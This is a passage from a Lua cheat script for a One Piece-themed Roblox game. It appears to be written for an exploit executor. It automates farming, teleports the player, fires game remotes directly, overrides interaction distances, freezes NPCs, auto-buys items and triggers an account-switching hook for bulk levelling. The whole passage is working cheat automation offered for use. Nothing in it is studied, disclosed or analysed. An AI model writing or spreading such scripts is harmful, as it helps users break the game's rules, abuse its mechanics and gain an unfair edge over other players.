        -- Lock position
        if (hrp.Position - lockPos.Position).Magnitude > 5 then
            hrp.CFrame = lockPos
        end
        
        -- Equip fruit
        local targetFruit = _G.Config.TargetFruit
        equipFruit(targetFruit)
        
        -- Open Haki + Observation Haki
        pcall(function() RemoteEvents:WaitForChild("HakiRemote"):FireServer("Toggle") end)
        pcall(function() RemoteEvents:WaitForChild("ObservationHakiRemote"):FireServer("Toggle") end)
        
        -- Use fruit abilities (Z, X, C, V) - use FruitPowerRemote (based on dex)
        for i, keyCode in ipairs(keyCodes) do
            pcall(function()
                local args = {
                    "UseAbility",
                    {
                        TargetPosition = hrp.Position,
                        FruitPower = targetFruit,
                        KeyCode = keyCode
                    }
                }
                RemoteEvents:WaitForChild("FruitPowerRemote"):FireServer(unpack(args))
            end)
            task.wait(0.3)
        end
        
        task.wait(1.5) -- Wait 1.5 seconds before using next ability
    end
    
end

-- [11] ARTIFACTS UNLOCK SYSTEM
local function checkArtifactsUnlocked()
    -- Check if Artifacts are opened (use data.Unlocked from GetArtifactData)
    local unlocked = false
    pcall(function()
        local data = RS:WaitForChild("RemoteFunctions"):WaitForChild("GetArtifactData"):InvokeServer()
        if data and type(data) == "table" and data.Unlocked == true then
            unlocked = true
        end
    end)
    return unlocked
end

local function unlockArtifacts()
    
    -- 1. Check if Artifacts are opened
    if checkArtifactsUnlocked() then
        return true
    end
    
    -- 2. Teleport to ArtifactsUnlocker NPC
    local npcCFrame = CFrame.new(-440.516388, 1.77979147, -1095.86072, -0.289305925, -0, -0.957236767, 0, 1, -0, 0.957236767, 0, -0.289305925)
    
    tweenPos(npcCFrame)
    task.wait(3)
    
    -- 3. Find Prompt and fire
    local npc = workspace:FindFirstChild("ServiceNPCs")
    if npc then
        npc = npc:FindFirstChild("ArtifactsUnlocker")
    end
    if npc then
        npc = npc:FindFirstChild("HumanoidRootPart")
    end
    
    local prompt = nil
    if npc then
        prompt = npc:FindFirstChild("ArtifactPrompt")
    end
    
    if not prompt then
        return false
    end
    
    prompt.MaxActivationDistance = math.huge
    fireproximityprompt(prompt)
    task.wait(2)
    
    -- 4. Wait for ConfirmUI and click Yes
    task.wait(1)
    
    local confirmUI = player.PlayerGui:FindFirstChild("ConfirmUI")
    if confirmUI and confirmUI.Enabled then
        local yesButton = confirmUI:FindFirstChild("MainFrame")
        if yesButton then
            yesButton = yesButton:FindFirstChild("ButtonsHolder")
        end
        if yesButton then
            yesButton = yesButton:FindFirstChild("Yes")
        end
        
        if yesButton then
            pcall(function()
                for _, connection in pairs(getconnections(yesButton.MouseButton1Click)) do
                    connection:Fire()
                end
            end)
        end
    else
        -- If no UI → Fire remote directly
        pcall(function()
            RemoteEvents:WaitForChild("ArtifactUnlockSystem"):FireServer()
        end)
    end
    
    task.wait(3)
    
    -- 5. Check if Artifacts are opened successfully
    if checkArtifactsUnlocked() then
        return true
    else
        return false
    end
end

local function equipArtifacts()
    
    -- 1. Open UI first
    pcall(function()
        RemoteEvents:WaitForChild("ArtifactUIOpened"):FireServer()
    end)
    task.wait(2)
    
    -- 2. Get all artifact data
    local data = nil
    local ok, err = pcall(function()
        data = RS:WaitForChild("RemoteFunctions"):WaitForChild("GetArtifactData"):InvokeServer()
    end)
    
    if data and type(data) == "table" then
        -- Deep debug: show all fields
        local allIds = {}
        local function deepScan(tbl, prefix)
            for k, v in pairs(tbl) do
                local key = prefix .. tostring(k)
                if type(v) == "table" then
                    deepScan(v, key .. ".")
                else
                    -- Save all string UUID values
                    if type(v) == "string" and v:match("%x%x%x%x%x%x%x%x%-%x%x%x%x") then
                        table.insert(allIds, v)
                    end
                end
            end
        end
        deepScan(data, "")
        
        -- Equip all found UUIDs
        for i, uuid in ipairs(allIds) do
            pcall(function()
                RemoteEvents:WaitForChild("ArtifactEquip"):FireServer(uuid)
            end)
            task.wait(0.5)
        end
    end
    
    task.wait(1)
    
    -- 3. Close UI → Click Close button in ArtifactsUI
    pcall(function()
        local artifactsUI = player.PlayerGui:FindFirstChild("ArtifactsUI")
        if artifactsUI then
            local mainFrame = artifactsUI:FindFirstChild("ArtifactsMainFrame")
            if mainFrame then
                local closeHolder = mainFrame:FindFirstChild("CloseButtonFrameHolder")
                if closeHolder then
                    -- Find button in CloseButtonFrameHolder
                    for _, btn in pairs(closeHolder:GetDescendants()) do
                        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                            pcall(function()
                                for _, conn in pairs(getconnections(btn.MouseButton1Click)) do
                                    conn:Fire()
                                end
                            end)
                            break
                        end
                    end
                end
            end
        end
    end)
    task.wait(0.5)
    
    -- Fallback: Fire remote + force disable
    pcall(function()
        RemoteEvents:WaitForChild("ArtifactCloseUI"):FireServer()
    end)
    pcall(function()
        local artifactsUI = player.PlayerGui:FindFirstChild("ArtifactsUI")
        if artifactsUI then
            artifactsUI.Enabled = false
        end
    end)
    
end

-- [12] OBSERVATION HAKI BUY SYSTEM (Level 6000+)
local function checkHasObservationHaki()
    -- Check if Observation Haki is already equipped (use HakiRemote GetProgression)
    local hasObs = false
    pcall(function()
        local data = RemoteEvents:WaitForChild("HakiRemote"):FireServer("GetProgression")
        -- Check from UI: If ObservationHaki UI is visible = already equipped
        local statsUI = player.PlayerGui:FindFirstChild("StatsPanelUI")
        if statsUI then
            for _, desc in pairs(statsUI:GetDescendants()) do
                if desc.Name:find("Observation") and desc:IsA("Frame") and desc.Visible == true then
                    hasObs = true
                    break
                end
            end
        end
    end)
    
    -- Fallback: Check if ObservationHakiRemote can respond
    if not hasObs then
        pcall(function()
            RemoteEvents:WaitForChild("ObservationHakiRemote"):FireServer("Toggle")
            task.wait(0.3)
            RemoteEvents:WaitForChild("ObservationHakiRemote"):FireServer("Toggle")
            -- If no error = already equipped
            -- Try checking from Character to see if effect is present
            local char = player.Character
            if char then
                for _, v in pairs(char:GetDescendants()) do
                    if v.Name:find("Observation") or v.Name:find("observation") then
                        hasObs = true
                        break
                    end
                end
            end
        end)
    end
    
    return hasObs
end

local function buyObservationHaki()
    
    -- 1. Check if already have
    if checkHasObservationHaki() then
        return true
    end
    
    -- 2. Teleport to ObservationBuyer NPC
    local npcCFrame = CFrame.new(-713.182922, 12.1339779, -527.289795, -0.763382077, 0, 0.645947695, 0, 1, 0, -0.645947695, 0, -0.763382077)
    
    tweenPos(npcCFrame)
    task.wait(3)
    
    -- 3. Find Prompt and fire
    local npc = workspace:FindFirstChild("ServiceNPCs")
    if npc then npc = npc:FindFirstChild("ObservationBuyer") end
    if npc then npc = npc:FindFirstChild("HumanoidRootPart") end
    
    local prompt = nil
    if npc then
        prompt = npc:FindFirstChild("ObservationHakiPrompt")
    end
    
    if not prompt then
        return false
    end
    
    prompt.MaxActivationDistance = math.huge
    fireproximityprompt(prompt)
    task.wait(2)
    
    -- 4. Wait for ConfirmUI and click Yes
    task.wait(1)
    
    local confirmUI = player.PlayerGui:FindFirstChild("ConfirmUI")
    if confirmUI and confirmUI.Enabled then
        local yesButton = confirmUI:FindFirstChild("MainFrame")
        if yesButton then yesButton = yesButton:FindFirstChild("ButtonsHolder") end
        if yesButton then yesButton = yesButton:FindFirstChild("Yes") end
        
        if yesButton then
            pcall(function()
                for _, connection in pairs(getconnections(yesButton.MouseButton1Click)) do
                    connection:Fire()
                end
            end)
        end
    end
    
    task.wait(3)
    
    -- 5. Check if purchase is successful
    return true
end

-- [11] BOSS KEY AUTO BUY SYSTEM (Real-time Stock Update)
local lastBossKeyBuyTime = 0
local isBuyingBossKey = false

local function buyBossKeysFromStock(bossKeyStock)
    if isBuyingBossKey then
        return false
    end
    
    local currentTime = tick()
    
    -- Prevent buying too fast (wait 5 seconds from last purchase)
    if currentTime - lastBossKeyBuyTime < 5 then
        return false
    end
    
    isBuyingBossKey = true
    
    -- Teleport to MerchantNPC
    local merchantCF = CFrame.new(368.817719, 2.79983521, 783.589844, -0.0566431284, 0, 0.998394549, 0, 1, 0, -0.998394549, 0, -0.0566431284)
    tweenPos(merchantCF)
    task.wait(3)
    
    -- Buy all
    for i = 1, bossKeyStock do
        pcall(function()
            RS.Remotes.MerchantRemotes.PurchaseMerchantItem:InvokeServer("Boss Key", 1)
        end)
        task.wait(0.5)
    end
    
    lastBossKeyBuyTime = currentTime
    isBuyingBossKey = false
    return true
end

-- Listen to MerchantStockUpdate event in real-time
local function setupBossKeyAutoListener()
    
    -- Check stock initially at startup
    task.spawn(function()
        task.wait(2)
        local success, stock = pcall(function()
            return RS.Remotes.MerchantRemotes.GetMerchantStock:InvokeServer()
        end)
        
        if success then
            
            if type(stock) == "table" then
                -- Information about items is in stock.stock
                local items = stock.stock or stock
                
                if type(items) == "table" then
                    -- Count number of items
                    local itemCount = 0
                    for _ in pairs(items) do itemCount = itemCount + 1 end
                    
                    -- Show information about all items
                    local foundBossKey = false
                    for key, item in pairs(items) do
                        if type(item) == "table" then
                            -- Show all fields of item
                            for k, v in pairs(item) do
                            end
                            
                            local itemName = item.name or item.itemId or item.Name or item.ItemId or item.itemName or tostring(key)
                            local itemStock = item.stock or item.quantity or item.Stock or item.Quantity or 0
                            
                            if itemName == "Boss Key" or (type(itemName) == "string" and string.find(itemName, "Boss Key")) then
                                foundBossKey = true
                                if itemStock > 0 then
                                    buyBossKeysFromStock(itemStock)
                                end
                                break
                            end
                        end
                    end
                    
                    if not foundBossKey then
                    end
                end
            end
        end
    end)
    
    -- Listen to event for stock update
    pcall(function()
        RS.Remotes.MerchantRemotes.MerchantStockUpdate.OnClientEvent:Connect(function(...)
            if not _G.Config.AutoBuyBossKey then return end
            
            local args = {...}
            
            -- Try to find information from all arguments
            for i, arg in ipairs(args) do
                if type(arg) == "table" then
                    for _, item in pairs(arg) do
                        if type(item) == "table" and (item.name == "Boss Key" or item.itemId == "Boss Key") then
                            local stock = item.stock or item.quantity or 0
                            if stock > 0 then
                                task.spawn(function()
                                    buyBossKeysFromStock(stock)
                                end)
                            end
                            return
                        end
                    end
                end
            end
        end)
    end)
    
end

-- [12] ICHIGO EXCHANGE SYSTEM
local function checkIchigoRequirements()
    -- Currently only Boss Ticket 500 is required
    local bossTicketCount = inventoryByRarity["Epic"]["Boss Ticket"] or 0
    
    -- If no information, try refresh
    if bossTicketCount == 0 then
        pcall(function() RS.Remotes.RequestInventory:FireServer() end)
        task.wait(1)
        bossTicketCount = inventoryByRarity["Epic"]["Boss Ticket"] or 0
    end
    
    local hasAllItems = bossTicketCount >= 500
    local missingItems = {}
    
    if not hasAllItems then
        table.insert(missingItems, string.format("Boss Ticket: %d / 500", bossTicketCount))
    end
    
    return hasAllItems, missingItems
end

local function exchangeIchigo()
    
    -- 1. Check if already have Ichigo
    if checkDarkBlade("Ichigo") then
        return true
    end
    
    -- 2. Check if have Boss Ticket 500
    local hasAll, missing = checkIchigoRequirements()
    
    if not hasAll then
        for _, item in pairs(missing) do
        end
        return false
    end
    
    
    -- 3. Call ExchangeItem remote directly
    local success = pcall(function()
        RS.Remotes.ExchangeItem:InvokeServer("Ichigo")
    end)
    
    if not success then
        return false
    end
    
    task.wait(3)
    
    -- 4. Check if got Ichigo
    if checkDarkBlade("Ichigo") then
        return true
    else
        return false
    end
end

-- [13] SABER BOSS FARM SYSTEM
local function checkBossKeyCount()
    -- Refresh inventory every time to get latest information
    pcall(function() RS.Remotes.RequestInventory:FireServer() end)
    task.wait(1)
    
    -- Boss Key is Epic rarity
    local count = inventoryByRarity["Epic"]["Boss Key"] or 0
    
    return count
end

local function farmSaberBoss()
    isFarmingIchigoBoss = true
    
    -- Loop until Boss Key is depleted
    while isFarmingIchigoBoss do
        -- Check Boss Key
        local bossKeyCount = checkBossKeyCount()
        
        if bossKeyCount < 1 then
            break
        end
        
        -- 1. Teleport to SummonBossNPC
        local summonNPCCFrame = CFrame.new(651.810181, -3.67419362, -1021.13123, 0.999550879, 0, 0.0299676117, 0, 1, 0, -0.0299676117, 0, 0.999550879)
        tweenPos(summonNPCCFrame)
        task.wait(3)
    
    -- 2. Call SaberBoss
    local success = pcall(function()
        RS.Remotes.RequestSummonBoss:FireServer("SaberBoss")
    end)
    
    if not success then
        pcall(function()
            RS.Remotes.RequestAutoSpawn:FireServer("SaberBoss")
        end)
    end
    
    task.wait(5)
    
    -- 3. Find SaberBoss and teleport to attack
    local boss = workspace:FindFirstChild("NPCs")
    if boss then boss = boss:FindFirstChild("SaberBoss") end
    
    if not boss then
        task.wait(10)
        boss = workspace:FindFirstChild("NPCs")
        if boss then boss = boss:FindFirstChild("SaberBoss") end
    end
    
    if boss and boss:FindFirstChild("HumanoidRootPart") and boss:FindFirstChild("Humanoid") then
        
        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then
            return
        end
        
        -- Equip Dark Blade (supports English and Thai)
        local tool = findDarkBladeInHand()
        if not tool then
            equipDarkBladeFromInventory()
            tool = findDarkBladeInHand()
        end
        if tool and tool.Parent == player.Backpack then
            char.Humanoid:EquipTool(tool)
        end
        
        -- Attack SaberBoss until death (same as farming NPC)
        local bossRoot = boss.HumanoidRootPart
        local bossHumanoid = boss.Humanoid
        local YPOS = 15
        local skillIndex = 1
        
        -- Selection box
        local box = Instance.new("SelectionBox")
        box.Adornee = boss
        box.Color3 = Color3.fromRGB(255, 0, 0)
        box.LineThickness = 0.1
        box.SurfaceTransparency = 0.6
        box.SurfaceColor3 = Color3.fromRGB(255, 0, 0)
        box.Parent = workspace
        
        repeat task.wait()
            if not boss or not boss.Parent or not boss:FindFirstChild("HumanoidRootPart") or bossHumanoid.Health <= 0 then
                break
            end
            if not char or not char:FindFirstChild("HumanoidRootPart") then break end
            if char.Humanoid.Health <= 0 then break end
            
            -- Equip Dark Blade every time (supports English and Thai)
            local tool = findDarkBladeInHand()
            if not tool then
                equipDarkBladeFromInventory()
                tool = findDarkBladeInHand()
            end
            if tool and tool.Parent == player.Backpack then
                char.Humanoid:EquipTool(tool)
            end
            
            -- BodyVelocity lock character
            BodyVelocity.Velocity = Vector3.zero
            BodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
            BodyVelocity.Parent = char.HumanoidRootPart
            
            -- Freeze Boss if owner
            local success, owner = pcall(function()
                return bossRoot:GetNetworkOwner()
            end)
            if success and owner == player then
                bossRoot.CFrame = CFrame.new(bossRoot.Position)
                bossRoot.AssemblyLinearVelocity = Vector3.zero
                bossRoot.AssemblyAngularVelocity = Vector3.zero
            end
            
            -- tweenPos close to SaberBoss
            tweenPos(
                CFrame.new(bossRoot.Position + Vector3.new(0, YPOS, 0)) * CFrame.Angles(math.rad(-90), 0, 0),
                function()
                    pcall(function()
                        local tool = char:FindFirstChildWhichIsA("Tool")
                        if tool then tool:Activate() end
                    end)
                    hitRemote:FireServer()
                end
            )
            
            -- Haki + Observation Haki
            pcall(function() RemoteEvents:WaitForChild("HakiRemote"):FireServer("Toggle") end)
            pcall(function() RemoteEvents:WaitForChild("ObservationHakiRemote"):FireServer("Toggle") end)
            
            -- Combo: skill 1 → basic attack → repeat
            pcall(function()
                RS:WaitForChild("AbilitySystem"):WaitForChild("Remotes"):WaitForChild("RequestAbility"):FireServer(skillIndex)
            end)
            pcall(function()
                local tool = char:FindFirstChildWhichIsA("Tool")
                if tool then tool:Activate() end
            end)
            hitRemote:FireServer()
            
            skillIndex = skillIndex + 1
            if skillIndex > 4 then skillIndex = 1 end
            
        until not boss.Parent or bossHumanoid.Health <= 0 or char.Humanoid.Health <= 0
        
        box:Destroy()
        
        -- Check if SaberBoss is dead or player died
        local bossStillAlive = boss and boss.Parent and boss:FindFirstChild("HumanoidRootPart") and bossHumanoid.Health > 0
        
        if bossStillAlive then
            -- Player died but SaberBoss is still alive → wait for respawn and return to attack
            task.wait(5)
            
            -- Check if SaberBoss is still alive (may have died during respawn)
            if boss and boss.Parent and boss:FindFirstChild("HumanoidRootPart") and bossHumanoid.Health > 0 then
                -- Find new character
                local newChar = player.Character or player.CharacterAdded:Wait()
                if newChar and newChar:FindFirstChild("HumanoidRootPart") then
                    
                    -- Teleport back to SaberBoss
                    local bossPos = boss.HumanoidRootPart.Position
                    tweenPos(CFrame.new(bossPos + Vector3.new(0, 15, 0)))
                    task.wait(3)
                end
            end
        else
            -- SaberBoss is really dead
            
            -- Check drops
            task.wait(2)
            
        end
    else
        task.wait(5)
    end
    
    end -- end while loop
    
    isFarmingIchigoBoss = false
end

-- [13] FRUIT FARM SYSTEM
local function startFruitFarm()
    isFruitFarming = true
    
    local targetFruit = _G.Config.TargetFruit
    
    -- 1. Check if already have fruit
    local hasFruitAlready = checkHasFruit(targetFruit)
    
    if hasFruitAlready then
        
        -- Eat fruit before farming (every time!)
        local fruitTool = getAnyFruitFromBackpack()
        if fruitTool then
            eatFruit(fruitTool)
            task.wait(2)
        end
        
        equipFruit(targetFruit)
        
        -- Go to farm (no reset!)
        local island = _G.Config.FruitFarmIsland
        local pos = _G.Config.FruitFarmPos
        
        pcall(function()
            tpRemote:FireServer(island)
        end)
        task.wait(3)
        
        local char = player.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            for i = 1, 10 do
                char.HumanoidRootPart.CFrame = pos
                task.wait(0.1)
            end
        end
        
        task.spawn(fruitFarmLoop)
        return true
    end
    
    -- 2. Check if reset (check from Power stat)
    local currentPower = 0
    pcall(function()
        currentPower = player.Data.Power.Value or 0
    end)
    
    if currentPower < 11500 then
        pcall(function()
            RemoteEvents:WaitForChild("ResetStats"):FireServer()
        end)
        task.wait(3)
        
        -- 3. Allocate Stats: Power 11500 → Sword
        local ok3, err3 = pcall(allocateStatsPowerFirst)
        if not ok3 then
        end
        task.wait(2)
    end
    
    -- 4. Buy random fruit until get target fruit
    local maxAttempts = 100
    local attemptNum = 0
    local gotTarget = false
    
    while maxAttempts > 0 and not gotTarget do
        maxAttempts = maxAttempts - 1
        attemptNum = attemptNum + 1
        
        -- 4a. Buy random fruit
        local ok4, err4 = pcall(buyRandomFruit)
        if not ok4 then
            task.wait(2)
        else
            -- 4b. Wait for fruit to load into Backpack (add wait time)
            task.wait(3)
            local fruitTool = getAnyFruitFromBackpack()
            
            if fruitTool then
                
                -- Check if fruit name contains targetFruit (e.g. "Quake Fruit" contains "Quake")
                local isTargetFruit = fruitTool.Name:find(targetFruit) ~= nil
                
                if isTargetFruit then
                    -- Got target fruit! → eat fruit before farming
                    eatFruit(fruitTool)
                    task.wait(2)
                    gotTarget = true
                else
                    -- Not target fruit → eat and discard
                    eatFruit(fruitTool)
                    task.wait(2)
                end
            else
                task.wait(2)
            end
        end
    end
    
    -- 5. Equip target fruit
    if checkHasFruit(targetFruit) then
        equipFruit(targetFruit)
        
        -- 6. Teleport to farm position
        local island = _G.Config.FruitFarmIsland
        local pos = _G.Config.FruitFarmPos
        
        pcall(function()
            tpRemote:FireServer(island)
        end)
        task.wait(3)
        
        local char = player.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            for i = 1, 10 do
                char.HumanoidRootPart.CFrame = pos
                task.wait(0.1)
            end
        end
        
        task.spawn(fruitFarmLoop)
        return true
    else
        isFruitFarming = false
        return false
    end
end

-- [11] HAKI QUEST SYSTEM
local function acceptHakiQuest()
    local hakiPos = Vector3.new(-497.94, 23.66, -1252.64)

    -- Cancel old quest (if exists and not Haki)
    pcall(function()
        local questUI = player.PlayerGui:FindFirstChild("QuestUI")
        if questUI and questUI:FindFirstChild("Quest") and questUI.Quest.Visible then
            local title = questUI.Quest.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text
            if not title:find("Path to Haki") then
                abandonRemote:FireServer("repeatable")
                task.wait(2)
            else
                return -- มี Haki quest อยู่แล้ว
            end
        end
    end)

    tweenPos(CFrame.new(hakiPos))
    task.wait(2)
    pcall(function() questRemote:FireServer("HakiQuestNPC") end)
    task.wait(2)
end

local function goToHakiNPC()
    local hakiPos = Vector3.new(-497.94, 23.66, -1252.64)
    tweenPos(CFrame.new(hakiPos))
    task.wait(4)

    local char = player.Character

    -- Press E key (main method)
    for i = 1, 5 do
        pcall(function()
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.CFrame = CFrame.new(hakiPos) * CFrame.new(0, 0, 3)
            end
        end)
        task.wait(0.5)
        VIM:SendKeyEvent(true, Enum.KeyCode.E, false, game)
        task.wait(0.1)
        VIM:SendKeyEvent(false, Enum.KeyCode.E, false, game)
        task.wait(2)

        if checkHakiStatus() then
            return true
        end
    end


    return false
end

local function farmThiefForHaki()
    local targetNPC = "Thief"
    local killCount = 0
    local lastCheckKills = 0

    -- Get NPC name from Quest
    pcall(function()
        local questUI = player.PlayerGui:FindFirstChild("QuestUI")
        if questUI and questUI:FindFirstChild("Quest") and questUI.Quest.Visible then
            local title = questUI.Quest.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text
            if not title:find("Path to Haki") then
                abandonRemote:FireServer("repeatable")
                task.wait(2)
            end
            local desc = questUI.Quest.Quest.Holder.Content.QuestInfo.QuestDescription.Text
            local name = desc:match("Defeat the (%w+)") or desc:match("defeat (%w+)")
            if name then targetNPC = name end
        end
    end)

    -- Teleport to farm
    pcall(function() tpRemote:FireServer("Starter") end)
    task.wait(3)

    local farmStart = tick()

    while task.wait(0.5) do
        if not isHakiQuestActive then break end
        if tick() - farmStart > _G.Config.HakiTimeout then
            isHakiQuestActive = false
            break
        end

        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then continue end
        if char.Humanoid.Health <= 0 then continue end

        -- เช็ค Quest progress
        local shouldGoToNPC = false
        local questUI = player.PlayerGui:FindFirstChild("QuestUI")
        local questVisible = questUI and questUI:FindFirstChild("Quest") and questUI.Quest.Visible

        if questVisible then
            pcall(function()
                for _, child in pairs(questUI.Quest.Quest.Holder.Content.QuestInfo:GetDescendants()) do
                    if child:IsA("TextLabel") then
                        if child.Text:find("Completed!") then
                            shouldGoToNPC = true
                            break
                        end
                        local cur, tot = child.Text:match("(%d+)/(%d+)")
                        if cur and tot and tonumber(cur) >= tonumber(tot) then
                            shouldGoToNPC = true
                        end
                    end
                end
            end)
        else
            if killCount > 5 and (killCount - lastCheckKills) >= 5 then
                shouldGoToNPC = true
            end
        end

        -- Go to send Quest
        if shouldGoToNPC then
            lastCheckKills = killCount

            if goToHakiNPC() then

                if _G.Config.BuyDarkBlade then
                    isHakiQuestActive = false
                    pcall(buyDarkBlade)
                end

                return
            end

            -- Get new NPC from new Quest
            pcall(function()
                local q = player.PlayerGui:FindFirstChild("QuestUI")
                if q and q:FindFirstChild("Quest") and q.Quest.Visible then
                    local desc = q.Quest.Quest.Holder.Content.QuestInfo.QuestDescription.Text
                    local name = desc:match("Defeat the (%w+)") or desc:match("defeat (%w+)")
                    if name then targetNPC = name; print("[HAKI QUEST] New target:", targetNPC) end
                end
            end)

            pcall(function() tpRemote:FireServer("Starter") end)
            task.wait(3)
            continue
        end

        -- Farm NPC
        local npcFound = false
        for i = 1, 5 do
            local npc = workspace.NPCs:FindFirstChild(targetNPC .. i)
            if npc and npc:FindFirstChild("Humanoid") and npc.Humanoid.Health > 0 then
                npcFound = true
                local target = npc:FindFirstChild("HumanoidRootPart")
                if target then
                    while npc.Parent and npc.Humanoid.Health > 0 do
                        if not char or not char:FindFirstChild("HumanoidRootPart") then break end
                        if char.Humanoid.Health <= 0 then break end
                        pcall(function() char.HumanoidRootPart.CFrame = target.CFrame * CFrame.new(0, 0, 5) end)
                        pcall(function() hitRemote:FireServer() end)
                        task.wait(0.3)
                    end
                    killCount = killCount + 1
                    break
                end
            end
        end

        if not npcFound then task.wait(3) end
    end
end

local function startHakiQuest()
    if not _G.Config.HakiQuest then return end
    pcall(acceptHakiQuest)
    pcall(farmThiefForHaki)
end

-- [11] NORMAL QUEST FARM
local function selectWeapon()
    -- Check if Dark Blade is in hand
    local blade = findDarkBladeInHand()
    if blade then return "Dark Blade" end

    -- Try Equip from Inventory
    if equipDarkBladeFromInventory() then return "Dark Blade" end

    -- No Dark Blade → use best weapon
    return getBestWeapon()
end

local function equipToolByName(toolName, char)
    local tool = nil
    if toolName == "Dark Blade" then
        tool = findDarkBladeInHand()
    else
        tool = player.Backpack:FindFirstChild(toolName) or char:FindFirstChild(toolName)
    end

    if tool and tool.Parent == player.Backpack then
        char.Humanoid:EquipTool(tool)
    end
    return tool
end

local function farmLoop()
    while _G.Config.AutoFarm do
        task.wait()

        -- Wait if Haki Quest, buy Dark Blade, Fruit Farm, or Ichigo Boss Farm is working
        if isHakiQuestActive or isBuyingDarkBlade or isFruitFarming or isFarmingIchigoBoss then
            task.wait(10)
            continue
        end

        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then continue end
        if char.Humanoid.Health <= 0 then continue end

        local questInfo = getQuestInfo()
        if not questInfo then continue end

        -- Check if Quest exists
        local questUI = player.PlayerGui:FindFirstChild("QuestUI")
        if not questUI then continue end

        if not questUI.Quest.Visible then
            -- No Quest → go to receive (SmartTP v3)
            _G.SmartTP(questInfo.position)
            questRemote:FireServer(questInfo.npcName)

        elseif questUI.Quest.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text ~= questInfo.questTitle then
            -- Quest wrong → cancel
            abandonRemote:FireServer("repeatable")

        else
            -- Quest correct → go to farm
            local toolName = selectWeapon()
            local npcType = getNpcType(questInfo.npcName)
            if not npcType then continue end

            -- Equip Dark Blade before farming
            equipToolByName(toolName, char)

            -- YPOS
            local YPOS = 9
            local firstMob = true

            -- Loop attack NPC until quest is finished/player dies/quest changes
            while _G.Config.AutoFarm do
                -- Check if quest is still active
                if char.Humanoid.Health <= 0 then break end
                if not questUI.Quest.Visible then break end
                if questUI.Quest.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text ~= questInfo.questTitle then break end

                local closest = findNPC(npcType)

                if not closest then
                    -- NPC not found → teleport to first quest position
                    if firstMob then
                        tweenPos(CFrame.new(questInfo.position))
                        task.wait(3)
                    end
                    task.wait(1)
                    firstMob = false
                    continue
                end
                firstMob = false


                -- Equip Dark Blade to ensure it's in hand
                equipToolByName(toolName, char)

                -- Selection box
                local box = Instance.new("SelectionBox")
                box.Adornee = closest
                box.Color3 = Color3.fromRGB(0, 255, 0)
                box.LineThickness = 0.08
                box.SurfaceTransparency = 0.6
                box.SurfaceColor3 = Color3.fromRGB(0, 255, 0)
                box.Parent = workspace

                -- Skill combo index (loop skill 1-4)
                local skillIndex = 1

                -- Combat loop: combo skill → basic attack → skill → basic attack
                repeat task.wait()

                    if not closest or not closest.Parent
                        or not closest:FindFirstChild("HumanoidRootPart")
                        or closest.Humanoid.Health <= 0 then
                        break
                    end

                    -- Equip weapon every time (to prevent hand from dropping)
                    equipToolByName(toolName, char)

                    -- BodyVelocity
                    BodyVelocity.Velocity = Vector3.zero
                    BodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    BodyVelocity.Parent = char.HumanoidRootPart

                    -- Freeze NPC if owner
                    local success, owner = pcall(function()
                        return closest.HumanoidRootPart:GetNetworkOwner()
                    end)
                    if success and owner == player then
                        closest.HumanoidRootPart.CFrame = CFrame.new(closest.HumanoidRootPart.Position)
                        closest.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                        closest.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                    end

                    -- tweenPos close to NPC
                    tweenPos(
                        CFrame.new(closest.HumanoidRootPart.Position + Vector3.new(0, YPOS, 0)) * CFrame.Angles(math.rad(-90), 0, 0),
                        function()
                            hitRemote:FireServer()
                        end
                    )

                    -- Haki + Observation Haki
                    pcall(function() RemoteEvents:WaitForChild("HakiRemote"):FireServer("Toggle") end)
                    pcall(function() RemoteEvents:WaitForChild("ObservationHakiRemote"):FireServer("Toggle") end)

                    -- Combo: skill 1 → basic attack → repeat
                    pcall(function()
                        RS:WaitForChild("AbilitySystem"):WaitForChild("Remotes"):WaitForChild("RequestAbility"):FireServer(skillIndex)
                    end)
                    hitRemote:FireServer() -- basic attack after skill (combo)
                    
                    skillIndex = skillIndex + 1
                    if skillIndex > 4 then skillIndex = 1 end

                until char.Humanoid.Health <= 0 or not questUI.Quest.Visible or questUI.Quest.Quest.Holder.Content.QuestInfo.QuestTitle.QuestTitle.Text ~= questInfo.questTitle

                box:Destroy()

                -- Equip Dark Blade back after NPC is dead (to prevent hand from dropping)
                equipToolByName(toolName, char)
                task.wait(0.3) -- Wait a bit and find next NPC
            end

        end
    end
end

-- [12] MAIN CONTROLLER
task.spawn(function()
    task.wait(3)
    pcall(function()
        local backpack = player:WaitForChild("Backpack", 10)
        if not backpack then return end
        local char = player.Character
        if not char then return end
        local tool = backpack:FindFirstChild("Combat")
        if tool then char:FindFirstChild("Humanoid"):EquipTool(tool) end
    end)
end)

-- Boss Key Auto Buy (Real-time Event Listener)
task.spawn(function()
    task.wait(15)
    
    if _G.Config.AutoBuyBossKey then
        setupBossKeyAutoListener()
    end
end)

-- System Loop: Level Check → Dark Blade → Haki → Farm (continues)
task.spawn(function()
    task.wait(10)

    while _G.Config.AutoFarm do
        local level = 0
        pcall(function() level = player.Data.Level.Value or 0 end)

        -- ===== PRIORITY -1: Check if account completion (Level 11500 + both Haki) =====
        if level >= 11500 then
            
            -- Check if both Haki are owned
            local hasArmamentHaki = false
            local hasObservationHaki = false
            
            pcall(function()
                -- Check Armament Haki
                local data = RemoteEvents:WaitForChild("HakiRemote"):FireServer("GetProgression")
                if data and data.Armament then
                    hasArmamentHaki = true
                end
                
                -- Check Observation Haki
                hasObservationHaki = checkHasObservationHaki()
            end)
            
            if hasArmamentHaki and hasObservationHaki then
                if _G.Horst_AccountChangeDone then
                    local ok, err = _G.Horst_AccountChangeDone()
                    if ok then
                        task.wait(999999) -- Wait for account switch
                    end
                end
            end
        end

        -- ===== Level < HakiMinLevel → normal farm =====
        if level < _G.Config.HakiMinLevel then
